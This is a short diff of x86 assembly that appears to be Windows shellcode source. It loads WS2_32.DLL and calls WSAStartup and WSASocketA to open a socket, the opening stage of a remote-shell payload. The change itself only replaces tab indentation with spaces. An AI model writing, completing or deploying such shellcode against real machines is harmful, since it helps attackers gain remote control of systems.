@@ -37,7 +37,7 @@ LLoadWinsock:
     pop ebx             ; save address to data in ebx
     lea ecx, [ebx + 24] ; find address of "WS2_32.DLL"
     push ecx            ; push address of "WS2_32.DLL"
-	call edi            ; call LoadLibraryA("WS2_32.DLL")     
+    call edi            ; call LoadLibraryA("WS2_32.DLL")     
     mov edi, ebx        ; store base of data section in edi
     mov ebx, eax        ; store base of winsock in ebx
     lea esi, [ebp + 20] ; store base of function table
@@ -55,19 +55,19 @@ Looper:
 
 LWSAStartup:                    ; WSAStartup (0x101, DATA)
     sub esp, [edi]
-	push esp
-	push dword [edi]
-	call FN_WSASTART
+    push esp
+    push dword [edi]
+    call FN_WSASTART
     xor eax, eax
     
 LWSASocketA:                    ; WSASocketA (2,1,0,0,0,0) 
-	push eax
-	push eax
-	push eax
-	push eax
-	inc eax
-	push eax
-	inc eax
-	push eax
-	call FN_WSASOCK
+    push eax
+    push eax
+    push eax
+    push eax
+    inc eax
+    push eax
+    inc eax
+    push eax
+    call FN_WSASOCK
     mov edi, eax
